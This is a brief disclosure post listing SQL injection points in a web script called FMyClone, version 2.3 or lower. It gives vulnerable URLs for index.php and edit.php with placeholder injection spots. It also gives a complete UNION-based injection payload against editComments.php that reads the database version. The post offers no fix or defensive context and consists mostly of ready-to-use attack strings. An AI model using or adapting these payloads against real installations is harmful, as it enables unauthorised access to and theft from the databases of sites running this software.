Product name: FMyClone
Version: 2.3 or maybe lower
Home: fmyclone.com

Different things might require some privileges to work but still sometimes these might be useful.

Vulns in the scripts:

http://localhost/exploit/FMyClone%20V2.3/index.php?comp=[SQLi/BSQL]

http://localhost/exploit/FMyClone V2.3/edit.php?act=comment&comp=2&id=[SQLi]
      //requires admin privilege

http://localhost/exploit/FMyClone%20V2.3/editComments.php?comp=1%27+union+all+select+1,2,@@version,4,5,6,7,8,9,10,11--+

And maybe there are more vulns in the scripts but I don't have time to analyze (Dashain, Exams and all on the head).
